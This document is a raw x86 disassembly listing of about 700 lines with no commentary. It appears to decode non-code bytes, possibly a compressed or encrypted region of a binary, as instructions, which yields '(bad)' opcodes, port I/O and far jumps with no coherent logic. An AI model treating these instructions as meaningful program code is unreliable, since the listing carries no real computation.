  41db6f:	hlt    
  41db70:	test   dl,bh
  41db72:	sub    dl,ch
  41db74:	gs es lock out 0x9f,al
  41db79:	stc    
  41db7a:	(bad)  
  41db7b:	shl    BYTE PTR [ecx],1
  41db7d:	jns    0x41db9d
  41db7f:	dec    edx
  41db80:	sbb    BYTE PTR [ecx-0x81a478],0xec
  41db87:	pushf  
  41db88:	pusha  
  41db89:	(bad)  
  41db8a:	in     eax,dx
  41db8b:	jmp    0xbf058243
  41db90:	in     eax,0xc9
  41db92:	mov    ah,0xf6
  41db94:	inc    edi
  41db95:	push   eax
  41db96:	adc    esp,DWORD PTR [edi]
  41db98:	cmp    DWORD PTR [eax-0x69],ecx
  41db9b:	mov    ecx,?
  41db9d:	jb     0x41db58
  41db9f:	and    al,0x27
  41dba1:	loopne 0x41db3e
  41dba3:	scas   eax,DWORD PTR es:[edi]
  41dba4:	aad    0xd0
  41dba6:	cmp    dh,ch
  41dba8:	imul   esp,DWORD PTR ds:0xca0165fb,0x57
  41dbaf:	sbb    ah,al
  41dbb1:	test   BYTE PTR [edx],ah
  41dbb3:	jae    0x41db91
  41dbb5:	cmp    al,0x9c
  41dbb7:	and    al,0x9e
  41dbb9:	scas   al,BYTE PTR es:[edi]
  41dbba:	add    edi,esp
  41dbbc:	sub    BYTE PTR gs:[ebx],bh
  41dbbf:	lock pop edx
  41dbc1:	out    0x56,eax
  41dbc3:	mov    ecx,0x1dea7924
  41dbc8:	sub    DWORD PTR [edi],edx
  41dbca:	mov    edx,0xdbb8e95a
  41dbcf:	ds call 0xe8e8:0xa2662887
  41dbd7:	and    al,0x6
  41dbd9:	mov    ebp,0x906e14a2
  41dbde:	adc    al,0x5a
  41dbe0:	and    al,0x97
  41dbe2:	inc    ebx
  41dbe3:	(bad)  
  41dbe4:	push   edi
  41dbe5:	pop    edi
  41dbe6:	mov    edx,0x16e9c78f
  41dbeb:	mov    ebp,0xf21ee621
  41dbf0:	or     DWORD PTR [eax+0x34],esi
  41dbf3:	out    dx,eax
  41dbf4:	jbe    0x41dbb3
  41dbf6:	mov    al,0xa4
  41dbf8:	scas   eax,DWORD PTR es:[edi]
  41dbf9:	add    ch,BYTE PTR [edx-0x4d]
  41dbfc:	mov    ch,0x88
  41dbfe:	jae    0x41dc13
  41dc00:	add    eax,0xdf0ac49
  41dc05:	mov    cl,0xe4
  41dc07:	pushf  
  41dc08:	jns    0x41dbe1
  41dc0a:	dec    edi
  41dc0b:	clc    
  41dc0c:	test   BYTE PTR [esi],bh
  41dc0e:	mov    bl,0x84
  41dc10:	jnp    0x41dbbf
  41dc12:	jne    0x41dc1c
  41dc14:	not    BYTE PTR [edi+edx*4+0x2d0920d6]
  41dc1b:	(bad)  
  41dc1c:	ficom  DWORD PTR [edx+0x2a4cb115]
  41dc22:	jnp    0x41dc19
  41dc24:	xchg   ebx,ecx
  41dc26:	stos   DWORD PTR es:[edi],eax
  41dc27:	das    
  41dc28:	add    DWORD PTR [edi-0x51],0xfffffff0
  41dc2c:	sbb    DWORD PTR [eax+0x1919fc30],ecx
  41dc32:	xor    al,0x2e
  41dc34:	das    
  41dc35:	adc    al,0xb4
  41dc37:	sbb    eax,0xdcf2d27a
  41dc3c:	mov    ch,0x30
  41dc3e:	imul   esi,ecx,0x5bb523d7
  41dc44:	pop    eax
  41dc45:	cdq    
  41dc46:	xchg   BYTE PTR [edi],dl
  41dc48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc49:	cmp    BYTE PTR [edx-0x1c],bh
  41dc4c:	imul   esi,ebx,0xffffffbb
  41dc4f:	ins    BYTE PTR es:[edi],dx
  41dc50:	xchg   ebp,eax
  41dc51:	(bad)  
  41dc52:	popa   
  41dc53:	jmp    0xe00df487
  41dc58:	and    ebx,DWORD PTR [ecx]
  41dc5a:	push   edi
  41dc5b:	mov    ds,ebp
  41dc5d:	out    dx,al
  41dc5e:	jo     0x41dcc6
  41dc60:	out    dx,eax
  41dc61:	cdq    
  41dc62:	mov    edi,DWORD PTR [ecx]
  41dc64:	fs ja  0x41dc1c
  41dc67:	xchg   BYTE PTR [ecx-0x3647cb95],al
  41dc6d:	sahf   
  41dc6e:	cmp    ecx,DWORD PTR [ecx]
  41dc70:	jae    0x41dcef
  41dc72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc73:	dec    ebp
  41dc74:	mov    ah,0xa7
  41dc76:	fistp  DWORD PTR [edx]
  41dc78:	cmp    al,0xc6
  41dc7a:	ret    0xcf93
  41dc7d:	call   0x152a3f22
  41dc82:	das    
  41dc83:	adc    eax,0x9a1af617
  41dc88:	mov    ah,0x2b
  41dc8a:	mov    edi,0x97497a20
  41dc8f:	dec    ecx
  41dc90:	aas    
  41dc91:	jge    0x41dc98
  41dc93:	push   edi
  41dc94:	push   0x39
  41dc96:	loop   0x41dcad
  41dc98:	imul   esp,DWORD PTR [ecx-0x63fcdb46],0x2b
  41dc9f:	fmul   DWORD PTR [bp+si]
  41dca2:	sub    ebp,DWORD PTR [edx+0x55]
  41dca5:	call   0x8a83b029
  41dcaa:	cli    
  41dcab:	inc    esp
  41dcac:	and    esi,DWORD PTR [ecx-0x5c3e2b9c]
  41dcb2:	sub    eax,DWORD PTR [edx+0x5c]
  41dcb5:	adc    ebx,DWORD PTR [ecx+ebx*8]
  41dcb8:	mov    eax,0x42c6de24
  41dcbd:	sbb    esi,eax
  41dcbf:	and    al,0x1b
  41dcc1:	push   edx
  41dcc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcc3:	cmp    ebp,edi
  41dcc5:	popf   
  41dcc6:	cmp    edx,DWORD PTR [ecx+eax*8+0x582c74e7]
  41dccd:	and    eax,0x184a8829
  41dcd2:	jmp    0x3fd7:0x1627b394
  41dcd9:	jg     0x41dcd6
  41dcdb:	push   ss
  41dcdc:	mov    ch,0xbd
  41dcde:	jnp    0x41dcc8
  41dce0:	or     ebx,DWORD PTR [eax-0x70]
  41dce3:	cmp    bh,bl
  41dce5:	jp     0x41dcc9
  41dce7:	(bad)  
  41dce8:	and    eax,0x310b3d65
  41dced:	mov    ds:0xb7353620,al
  41dcf2:	sub    ah,dh
  41dcf4:	add    eax,0x1bd3e932
  41dcf9:	cmp    DWORD PTR [edx-0x25],ebx
  41dcfc:	add    eax,0x1d88787f
  41dd01:	popf   
  41dd02:	imul   ecx,DWORD PTR [esi+ebp*4],0x41
  41dd06:	mov    BYTE PTR ds:0x6e94ad8c,0x83
  41dd0d:	call   0x6217:0xc8ec54ce
  41dd14:	xlat   BYTE PTR ds:[ebx]
  41dd15:	pushf  
  41dd16:	jnp    0x41dd59
  41dd18:	in     al,dx
  41dd19:	mov    esp,0x90652a8d
  41dd1e:	hlt    
  41dd1f:	fmul   QWORD PTR ds:0xff48639c
  41dd25:	dec    DWORD PTR [ebx+eiz*4-0x6a]
  41dd29:	ins    BYTE PTR es:[edi],dx
  41dd2a:	mov    edi,0x1d62e6f6
  41dd2f:	scas   al,BYTE PTR es:[edi]
  41dd30:	xchg   ecx,eax
  41dd31:	cmp    al,0x5f
  41dd33:	jmp    0x41dcd8
  41dd35:	es mov al,0xfd
  41dd38:	xchg   ebp,eax
  41dd39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd3a:	imul   ecx,eax,0x47
  41dd3d:	pushf  
  41dd3e:	push   ebx
  41dd3f:	rol    esi,cl
  41dd41:	pushf  
  41dd42:	jnp    0x41dd8b
  41dd44:	stos   DWORD PTR es:[edi],eax
  41dd45:	jmp    edx
  41dd47:	test   eax,0x800d5e41
  41dd4c:	push   ss
  41dd4d:	and    eax,0xa6cfc4ec
  41dd52:	pop    ebx
  41dd53:	daa    
  41dd54:	fdiv   DWORD PTR [ebx]
  41dd56:	je     0x41dd78
  41dd58:	ficom  WORD PTR [bp+di-0x4e29]
  41dd5d:	aaa    
  41dd5e:	mov    al,ds:0x48a33905
  41dd63:	out    0xcf,eax
  41dd65:	(bad)  
  41dd67:	dec    esi
  41dd68:	and    eax,0x5fa8cb7c
  41dd6d:	sti    
  41dd6e:	aas    
  41dd6f:	test   dl,0xa6
  41dd72:	sub    eax,0xb2d62329
  41dd77:	bound  esi,QWORD PTR fs:[ecx+0x3f]
  41dd7b:	fidiv  WORD PTR [ebp+0xc]
  41dd7e:	xchg   ebx,eax
  41dd7f:	jmp    0x891a:0xffbaeb83
  41dd86:	je     0x41dd9d
  41dd88:	les    eax,FWORD PTR [ecx-0x35]
  41dd8b:	add    eax,0x5bf331fa
  41dd90:	addr16 out 0x5a,eax
  41dd93:	inc    esi
  41dd94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd95:	std    
  41dd96:	push   ebp
  41dd97:	out    dx,eax
  41dd98:	add    BYTE PTR [esi+0x75],dl
  41dd9b:	mov    ebp,0xb567d368
  41dda0:	int    0xdb
  41dda2:	test   al,0xe7
  41dda4:	cdq    
  41dda5:	adc    eax,0xd4170f2c
  41ddaa:	scas   al,BYTE PTR es:[edi]
  41ddab:	fidivr DWORD PTR [ebx-0x5d]
  41ddae:	imul   eax,DWORD PTR [ecx+eiz*1-0x53],0x42
  41ddb3:	aas    
  41ddb4:	or     al,0x3a
  41ddb6:	imul   ebp,ecx,0x7e9ba57a
  41ddbc:	or     ch,BYTE PTR [eax]
  41ddbe:	cmc    
  41ddbf:	cld    
  41ddc0:	adc    eax,0x4de844d7
  41ddc5:	lea    edi,[ecx]
  41ddc7:	pushf  
  41ddc8:	pop    ebp
  41ddc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddca:	inc    eax
  41ddcb:	pop    esp
  41ddcc:	and    DWORD PTR [ecx-0x423e1b82],ebp
  41ddd2:	pop    eax
  41ddd3:	mov    ebx,0x675bbe81
  41ddd8:	push   ds
  41ddd9:	clc    
  41ddda:	cs mov ebp,0xf1f1cd23
  41dde0:	aam    0xc9
  41dde2:	mov    dh,0x25
  41dde4:	mul    BYTE PTR [eax]
  41dde6:	test   eax,0xe7af49fe
  41ddeb:	and    DWORD PTR [ecx],esp
  41dded:	add    eax,0x6a0b13f4
  41ddf2:	push   eax
  41ddf3:	loopne 0x41ddcc
  41ddf5:	fwait
  41ddf6:	and    ebp,esp
  41ddf8:	mov    ds:0x76089b19,al
  41ddfd:	inc    ebp
  41ddfe:	xor    ebx,DWORD PTR [esi+0x1e]
  41de01:	call   0x9886:0x909403ea
  41de08:	loope  0x41de74
  41de0a:	mov    ebx,0x682c3504
  41de0f:	mov    ss,ebp
  41de11:	adc    BYTE PTR [eax+0x28a93ced],0x9b
  41de18:	and    ch,cl
  41de1a:	inc    ecx
  41de1b:	call   0xe5ed8ed9
  41de20:	pop    ebp
  41de21:	mov    eax,ds:0xd4f0b29b
  41de26:	jo     0x41de7b
  41de28:	in     al,0xd9
  41de2a:	cmp    BYTE PTR [esi+ebp*4],0xa9
  41de2e:	in     eax,dx
  41de2f:	xor    eax,0x54b88b8c
  41de34:	and    esp,DWORD PTR [esi-0x3c146995]
  41de3a:	cmp    DWORD PTR [edx],esp
  41de3c:	rcl    BYTE PTR [edi+0x112f9884],cl
  41de42:	mov    ebp,0xe6c4cc04
  41de47:	lods   al,BYTE PTR ds:[esi]
  41de48:	xchg   ebp,eax
  41de49:	out    dx,al
  41de4a:	mov    cl,0xe6
  41de4c:	xchg   cl,ah
  41de4e:	or     DWORD PTR ds:0xcb64922,ebx
  41de54:	xchg   esi,eax
  41de55:	icebp  
  41de56:	sahf   
  41de57:	cmp    DWORD PTR [ebx+0x35a90b9e],eax
  41de5d:	in     eax,0x7c
  41de5f:	fst    DWORD PTR [ebp-0x55]
  41de62:	in     eax,0x5d
  41de64:	sbb    al,0xe9
  41de66:	or     al,0xbc
  41de68:	data16 mov fs,WORD PTR [ebp-0x2e]
  41de6c:	sbb    ah,BYTE PTR [edi-0x12b329a5]
  41de72:	cmp    DWORD PTR [esi-0x5b],0xffffffa4
  41de76:	out    dx,eax
  41de77:	xchg   edx,eax
  41de78:	cwde   
  41de79:	icebp  
  41de7a:	mov    edi,0xff1684d4
  41de7f:	jae    0x41de25
  41de81:	mov    eax,0xbf38ccb
  41de86:	pusha  
  41de87:	ficomp DWORD PTR [ebp+0x1d]
  41de8a:	mov    ecx,0xc4adc79
  41de8f:	mov    bh,0x1c
  41de91:	adc    DWORD PTR ds:0xb6ba35b2,ebx
  41de97:	jno    0x41dee3
  41de99:	cmp    al,0x44
  41de9b:	test   al,0x8
  41de9d:	(bad)  
  41de9e:	mov    al,0x4
  41dea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dea1:	fs pop es
  41dea3:	cwde   
  41dea4:	xchg   esp,eax
  41dea5:	xor    al,0xb3
  41dea7:	push   esp
  41dea8:	cwde   
  41dea9:	jp     0x41dead
  41deab:	xchg   esp,eax
  41deac:	and    eax,0x94ebae28
  41deb1:	sbb    eax,0x2925bcd7
  41deb6:	loopne 0x41de47
  41deb8:	jne    0x41df30
  41deba:	push   es
  41debb:	jne    0x41df25
  41debd:	daa    
  41debe:	shr    DWORD PTR [ecx-0x300465bb],cl
  41dec4:	aam    0x47
  41dec6:	and    esp,DWORD PTR [ebp+0xd687262]
  41decc:	sub    ah,BYTE PTR [edi+0x56dce8ab]
  41ded2:	xchg   ecx,eax
  41ded3:	or     esi,DWORD PTR [esi-0x70519464]
  41ded9:	in     eax,dx
  41deda:	pop    edx
  41dedb:	leave  
  41dedc:	or     edi,DWORD PTR [ebx]
  41dede:	lea    edi,[esi+0x17]
  41dee1:	imul   esp,ecx,0xe3acedab
  41dee7:	loope  0x41de8a
  41dee9:	test   esp,edi
  41deeb:	sub    BYTE PTR [ecx-0x77],bh
  41deee:	ror    DWORD PTR [ebp-0x15607c43],0x3
  41def5:	sbb    edx,DWORD PTR [edi]
  41def7:	(bad)  
  41def8:	adc    dl,dl
  41defa:	lds    esi,FWORD PTR cs:[eax+ecx*1]
  41defe:	(bad)  
  41df00:	pusha  
  41df01:	xor    eax,0x8a150598
  41df06:	ret    
  41df07:	inc    BYTE PTR [ecx]
  41df09:	xchg   esi,eax
  41df0a:	test   al,0xa6
  41df0c:	rcr    eax,cl
  41df0e:	sub    DWORD PTR [ecx-0x6b47e9d0],ebp
  41df14:	push   ebp
  41df15:	lock xchg esp,eax
  41df17:	bound  edx,QWORD PTR [esi-0x5ba01cae]
  41df1d:	or     cl,BYTE PTR [ecx]
  41df1f:	jne    0x41df46
  41df21:	fcomp  QWORD PTR [eax-0x2]
  41df24:	in     al,0xc8
  41df26:	mov    ds:0xad9ae1b0,al
  41df2b:	ss pop ebp
  41df2d:	das    
  41df2e:	mov    ch,0x5c
  41df30:	lods   eax,DWORD PTR ds:[esi]
  41df31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df32:	retf   
  41df33:	jg     0x41df82
  41df35:	pop    ds
  41df36:	inc    esp
  41df37:	stc    
  41df38:	inc    ebx
  41df39:	lea    esp,[edi+0x2]
  41df3c:	push   0x96b4ce85
  41df41:	push   edi
  41df42:	or     dh,dl
  41df44:	cmp    DWORD PTR [edi-0x41],0xffffffba
  41df48:	push   ds
  41df49:	leave  
  41df4a:	ds cli 
  41df4c:	jb     0x41dedb
  41df4e:	cli    
  41df4f:	les    ebx,FWORD PTR ds:0x83d75529
  41df55:	adc    eax,0xa1340d2d
  41df5a:	mov    ecx,DWORD PTR [edx]
  41df5c:	cmp    eax,0xd122858a
  41df61:	mov    WORD PTR [esi+0x71],fs
  41df64:	mov    bl,0x0
  41df66:	xchg   ebx,eax
  41df67:	cmp    ah,dl
  41df69:	or     BYTE PTR [edi-0x4507bd74],0x54
  41df70:	fiadd  WORD PTR [ecx]
  41df72:	in     al,0xd0
  41df74:	popf   
  41df75:	mov    al,ds:0xa565757b
  41df7a:	pop    eax
  41df7b:	mov    al,cl
  41df7d:	pop    eax
  41df7e:	xor    edi,DWORD PTR [edi-0x6f]
  41df81:	xchg   edi,eax
  41df82:	enter  0xb104,0x60
  41df86:	xor    eax,0x7d864c9d
  41df8b:	jae    0x41dfe5
  41df8d:	jp     0x41dfb7
  41df8f:	ins    DWORD PTR es:[edi],dx
  41df90:	push   ebx
  41df91:	adc    DWORD PTR [eax-0x5c],edi
  41df94:	int    0xe6
  41df96:	arpl   WORD PTR [edx+0x4e],cx
  41df99:	repnz mov edx,0x7b9c2642
  41df9f:	ficomp DWORD PTR [edx+ebx*1]
  41dfa2:	xchg   ebp,eax
  41dfa3:	dec    edi
  41dfa4:	bnd jp 0x41dfc3
  41dfa7:	cdq    
  41dfa8:	or     DWORD PTR [ebx-0x16],0xb53c5952
  41dfaf:	dec    esp
  41dfb0:	dec    eax
  41dfb1:	fldenv [esp+eax*4-0x78]
  41dfb5:	mov    bl,0x6d
  41dfb7:	adc    eax,0xe97007a2
  41dfbc:	mov    ch,0x1b
  41dfbe:	add    al,0xf3
  41dfc0:	mov    edi,0xbac1ac94
  41dfc5:	not    DWORD PTR [esi+0x292cf26d]
  41dfcb:	gs pop ds
  41dfcd:	push   cs
  41dfce:	imul   eax,DWORD PTR [edx],0x2d
  41dfd1:	lahf   
  41dfd2:	sbb    ecx,edx
  41dfd4:	jecxz  0x41dfa8
  41dfd6:	loopne 0x41e038
  41dfd8:	xchg   BYTE PTR [eax+0x147292fe],ah
  41dfde:	mov    al,0xe4
  41dfe0:	bswap  ecx
  41dfe2:	cmc    
  41dfe3:	arpl   WORD PTR ds:0xd5e918f5,dx
  41dfe9:	sub    DWORD PTR [esi],0xfffffffb
  41dfec:	mov    WORD PTR [ecx+0x4650f69c],ds
  41dff2:	nop
  41dff3:	ret    0x1f57
  41dff6:	out    0x38,al
  41dff8:	hlt    
  41dff9:	mov    al,ds:0x608004ab
  41dffe:	or     DWORD PTR [ebp-0x75],esp
  41e001:	jbe    0x41dfbc
  41e003:	cdq    
  41e004:	xchg   DWORD PTR [edx-0x45],ecx
  41e007:	hlt    
  41e008:	clc    
  41e009:	cmp    BYTE PTR [esi+ebx*2],dl
  41e00c:	and    eax,0x25e8319d
  41e011:	jno    0x41df95
  41e013:	test   eax,0x60d4eb7e
  41e018:	pop    ss
  41e019:	jns    0x41e093
  41e01b:	int3   
  41e01c:	arpl   si,sp
  41e01e:	repz fcomip st,st(6)
  41e021:	cmp    DWORD PTR [ecx+0x61],ebx
  41e024:	jmp    0x41dfc3
  41e026:	and    bh,BYTE PTR [edi-0x1aa5567f]
  41e02c:	cdq    
  41e02d:	fmul   st(2),st
  41e02f:	inc    esp
  41e030:	scas   al,BYTE PTR es:[edi]
  41e031:	jmp    0x41e05e
  41e033:	sti    
  41e034:	xor    ah,BYTE PTR [ebp+0x67b99abb]
  41e03a:	sub    ecx,eax
  41e03c:	fcomp  QWORD PTR [edi-0x28]
  41e03f:	aaa    
  41e040:	jl     0x41e0ae
  41e042:	mov    ds:0xf6a06915,eax
  41e047:	lock jne 0x41dfff
  41e04a:	imul   ebp,DWORD PTR [edx-0x65858768],0xffffff84
  41e051:	adc    al,0xda
  41e053:	fmul   QWORD PTR [edx+0x1e50bf1a]
  41e059:	leave  
  41e05a:	mov    ebx,0x462d41b2
  41e05f:	xchg   ebx,eax
  41e060:	aas    
  41e061:	sahf   
  41e062:	stos   DWORD PTR es:[edi],eax
  41e063:	cmp    eax,0xa7f27f31
  41e069:	out    dx,eax
  41e06a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e06b:	stos   BYTE PTR es:[edi],al
  41e06c:	in     eax,0xe
  41e06e:	fadd   st,st(4)
  41e070:	lods   eax,DWORD PTR ds:[esi]
  41e071:	mov    eax,ds:0x8ed43617
  41e076:	shl    DWORD PTR [edi],cl
  41e078:	push   0xffffff9e
  41e07a:	imul   DWORD PTR [ecx-0x75eeedf]
  41e080:	out    dx,eax
  41e081:	inc    BYTE PTR [eax+0x36]
  41e084:	sbb    DWORD PTR [ecx-0x24edbf9c],ebx
  41e08a:	int3   
  41e08b:	xchg   ebp,eax
  41e08c:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e08e:	fild   DWORD PTR [ecx]
  41e090:	loope  0x41e0c2
  41e092:	fld    TBYTE PTR [ecx-0x5dbe9dbb]
  41e098:	(bad)  
  41e099:	pop    edx
  41e09a:	mov    ebx,0x3c09ae14
  41e09f:	xchg   ecx,eax
  41e0a0:	mov    ch,0xe2
  41e0a2:	adc    dh,dl
  41e0a4:	mov    bl,0xc7
  41e0a6:	ja     0x41e046
  41e0a8:	and    bl,cl
  41e0aa:	stos   DWORD PTR es:[edi],eax
  41e0ab:	jmp    0x41e070
  41e0ad:	pop    eax
  41e0ae:	mov    ah,0xf3
  41e0b0:	mov    eax,0x5ac31b9a
  41e0b5:	pop    ss
  41e0b6:	pop    esi
  41e0b7:	pop    ebp
  41e0b8:	xchg   DWORD PTR [edx],esp
  41e0ba:	ret    
  41e0bb:	dec    edx
  41e0bc:	mov    cl,0xea
  41e0be:	mov    edi,0xf28e0e14
  41e0c3:	out    0xc5,al
  41e0c5:	mov    al,ds:0xa14ee6e9
  41e0ca:	pop    ds
  41e0cb:	xor    DWORD PTR ds:0x1f8221d9,ebx
  41e0d1:	pop    edx
  41e0d2:	ja     0x41e07f
  41e0d4:	call   0x6a10:0x3886bb9b
  41e0db:	push   ds
  41e0dc:	stc    
  41e0dd:	call   0x44b7:0x47f395d1
  41e0e4:	or     BYTE PTR [ecx-0x486877d0],ch
  41e0ea:	dec    ebp
  41e0eb:	retf   
  41e0ec:	push   ebp
  41e0ed:	mov    edx,0x89bdf3a3
  41e0f2:	ror    BYTE PTR [ebp-0x142c876a],1
  41e0f8:	xor    eax,0x6734b83e
  41e0fd:	loope  0x41e09a
  41e0ff:	xchg   ecx,eax
  41e100:	(bad)  
  41e101:	fdiv   DWORD PTR [edi+0x6c8118e2]
  41e107:	loopne 0x41e090
  41e109:	mov    ecx,0x643d36f3
  41e10e:	ret    0x8d74
  41e111:	sti    
  41e112:	xchg   edi,eax
  41e113:	addr16 loope 0x41e12e
  41e116:	retf   
  41e117:	inc    ecx
  41e118:	adc    eax,0x86eef958
  41e11d:	xchg   ecx,eax
  41e11e:	es mov al,0x7d
  41e121:	and    BYTE PTR [edi+0x56],al
  41e124:	adc    BYTE PTR [ebx+0x740354b0],ah
  41e12a:	shr    DWORD PTR [ebx-0x15f70ffb],0x94
  41e131:	xlat   BYTE PTR ds:[ebx]
  41e132:	(bad)  
  41e133:	mov    ecx,0xfcedcae6
  41e138:	sbb    ch,bl
  41e13a:	sbb    eax,DWORD PTR [ebp-0x22ba135b]
  41e140:	aad    0xb8
  41e142:	xor    eax,0x6f31a4e5
  41e147:	mov    WORD PTR [ecx+0x28655e00],fs
  41e14d:	mov    al,ds:0xef82b4b1
  41e152:	fmul   QWORD PTR [ebp+eax*2+0x71f46df2]
  41e159:	xchg   esi,eax
  41e15a:	(bad)  
  41e15b:	fwait
  41e15c:	std    
  41e15d:	int3   
  41e15e:	inc    eax
  41e15f:	loopne 0x41e16e
  41e161:	cs mov edi,0xea2815e6
  41e167:	adc    BYTE PTR [esi],ah
  41e169:	add    eax,0x620882f5
  41e16e:	mov    ds:0xca82e8c5,al
  41e173:	mov    al,ds:0xac7e66c4
  41e178:	out    dx,al
  41e179:	repz mov esi,0x88b08254
  41e17f:	pop    edx
  41e180:	aad    0x79
  41e182:	shl    eax,cl
  41e184:	sti    
  41e185:	jno    0x41e13a
  41e187:	and    DWORD PTR [esi],edx
  41e189:	leave  
  41e18a:	mov    bh,0x27
  41e18c:	jg     0x41e197
  41e18e:	xchg   ebx,eax
  41e18f:	push   ecx
  41e190:	dec    eax
  41e191:	mov    al,ds:0xfd1f62ab
  41e196:	int    0xa5
  41e198:	fimul  DWORD PTR [eax+eiz*8-0x463c519a]
  41e19f:	adc    al,0x94
  41e1a1:	mov    cl,0xda
  41e1a3:	daa    
  41e1a4:	xchg   BYTE PTR [ebx],bl
  41e1a6:	sub    ah,BYTE PTR [ebx]
  41e1a8:	imul   eax,ebp,0xffffffb5
  41e1ab:	jecxz  0x41e19a
  41e1ad:	shl    DWORD PTR [ebp-0x48ade742],1
  41e1b3:	add    al,0xe2
  41e1b5:	ret    0xa9c3
  41e1b8:	xchg   esp,eax
  41e1b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1ba:	fwait
  41e1bb:	jmp    0x41e19f
  41e1bd:	fimul  WORD PTR [ebp+0x72]
  41e1c0:	in     eax,0xf7
  41e1c2:	mov    eax,edx
  41e1c4:	mov    ebp,0x1074b3d9
  41e1c9:	push   esi
  41e1ca:	js     0x41e1f5
  41e1cc:	and    al,0x63
  41e1ce:	ins    BYTE PTR es:[edi],dx
  41e1cf:	dec    ebp
  41e1d0:	push   0xffffffcb
  41e1d2:	and    DWORD PTR [edi+edx*1],esi
  41e1d5:	jmp    0xaf9a8f0c
  41e1da:	adc    al,0x6d
  41e1dc:	in     eax,dx
  41e1dd:	mov    bl,bh
  41e1df:	dec    ebp
  41e1e0:	push   ss
  41e1e1:	mov    eax,ds:0x12555698
  41e1e6:	cs and al,0x25
  41e1e9:	dec    ecx
  41e1ea:	cmp    al,0xd4
  41e1ec:	mov    bl,0x3e
  41e1ee:	aad    0xcb
  41e1f0:	pop    edx
  41e1f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1f2:	jnp    0x41e1e7
  41e1f4:	push   esi
  41e1f5:	(bad)  
  41e1f6:	mov    ah,0xf3
  41e1f8:	sub    edi,DWORD PTR [edx]
  41e1fa:	sub    edx,DWORD PTR [ecx+ebx*1+0x14bfb089]
  41e201:	pop    esp
  41e202:	in     al,0xb7
  41e204:	fcomp  QWORD PTR [ebx+ebp*8-0x2b6338cb]
  41e20b:	cld    
  41e20c:	jmp    0x123732be
  41e211:	push   edx
  41e212:	popa   
  41e213:	xchg   ebp,eax
  41e214:	out    0x8b,al
  41e216:	cld    
  41e217:	sbb    ebx,edi
  41e219:	in     eax,dx
  41e21a:	pop    es
  41e21b:	outs   dx,DWORD PTR ds:[esi]
  41e21c:	out    0xce,al
  41e21e:	mov    esi,0xcdbcad0c
  41e223:	add    eax,0xecaf6001
  41e228:	inc    ebp
  41e229:	leave  
  41e22a:	mov    ds:0x24afb5f4,eax
  41e22f:	stc    
  41e230:	sbb    ch,BYTE PTR [ecx+0x5250b7be]
  41e236:	xor    cl,BYTE PTR [ebx-0x11]
  41e239:	mov    eax,ds:0x3024b06b
  41e23e:	lahf   
  41e23f:	jge    0x41e1ef
  41e241:	pop    ebx
  41e242:	adc    al,BYTE PTR [ebx-0x13]
  41e245:	pop    ecx
  41e246:	xor    eax,0xb93effa7
  41e24b:	xor    al,0x69
  41e24d:	push   ebp
  41e24e:	sahf   
  41e24f:	(bad)  
  41e250:	push   edi
  41e251:	rol    DWORD PTR [ecx-0x56],0x12
  41e255:	retf   
  41e256:	mov    eax,ds:0x999c4f5f
  41e25b:	lock and ecx,ecx
  41e25e:	xor    bl,cl
  41e260:	jnp    0x41e24d
  41e262:	icebp  
  41e263:	add    ah,BYTE PTR [edi+ebp*2-0x377520d]
  41e26a:	and    ebp,DWORD PTR [esi-0xf6cd2cb]
  41e270:	mov    edi,0xd1f9a7d8
  41e275:	sahf   
  41e276:	dec    eax
  41e277:	or     BYTE PTR [edi],bl
  41e279:	stc    
  41e27a:	in     al,dx
  41e27b:	sub    al,0x5
  41e27d:	add    DWORD PTR [eax-0x74c23edc],esp
  41e283:	jae    0x41e2ca
  41e285:	mov    bl,0x92
  41e287:	out    dx,eax
  41e288:	sbb    al,0xbd
  41e28a:	imul   ecx,DWORD PTR [edi-0x12],0xffffff80
  41e28e:	mov    esi,0xfafda5eb
  41e293:	and    edx,DWORD PTR [edi-0x7f57113]
  41e299:	mov    ch,0xb8
  41e29b:	je     0x41e2b0
  41e29d:	lahf   
  41e29e:	sub    edi,DWORD PTR [edi+0xb3b0db5]
  41e2a4:	(bad)  
  41e2a6:	(bad)  
  41e2a7:	in     eax,0x1d
  41e2a9:	cmp    esi,eax
  41e2ab:	jnp    0x41e2e5
  41e2ad:	push   esp
  41e2ae:	cld    
  41e2af:	mov    esi,0xbd62df92
  41e2b4:	push   es
  41e2b5:	push   eax
  41e2b6:	aas    
  41e2b7:	adc    esi,esp
  41e2b9:	dec    eax
  41e2ba:	sbb    al,0x84
  41e2bc:	mov    cl,0x62
  41e2be:	mov    dh,0x1a
  41e2c0:	push   es
  41e2c1:	cmp    esp,ebp
  41e2c3:	fistp  WORD PTR fs:[ecx-0x17e0bb07]
  41e2ca:	rol    BYTE PTR [ecx],cl
  41e2cc:	lds    esp,FWORD PTR [edi+0x5d]
  41e2cf:	out    0x13,al
  41e2d1:	xor    al,0x8
  41e2d3:	jb     0x41e2ab
  41e2d5:	pop    edx
  41e2d6:	mov    dl,0xc0
  41e2d8:	inc    edx
  41e2d9:	pop    ebp
  41e2da:	xchg   BYTE PTR [ebp+0x309b979a],bl
  41e2e0:	cmp    BYTE PTR [edx],0xb8
  41e2e3:	pusha  
  41e2e4:	aad    0x9d
  41e2e6:	mov    ch,0x64
  41e2e8:	fsub   DWORD PTR [ebp+0x43]
  41e2eb:	stos   DWORD PTR es:[edi],eax
  41e2ec:	push   ebp
  41e2ed:	push   edi
  41e2ee:	pop    edx
  41e2ef:	repz pop edi
  41e2f1:	lods   eax,DWORD PTR ds:[esi]
  41e2f2:	or     BYTE PTR [ebp+0x1d],0x79
  41e2f6:	loop   0x41e340
  41e2f8:	push   edi
  41e2f9:	and    ebp,DWORD PTR [esi-0x2b]
  41e2fc:	imul   ecx,DWORD PTR [esi],0xffffffec
  41e2ff:	in     eax,0x44
  41e301:	sbb    DWORD PTR [edx],0x5ff1d380
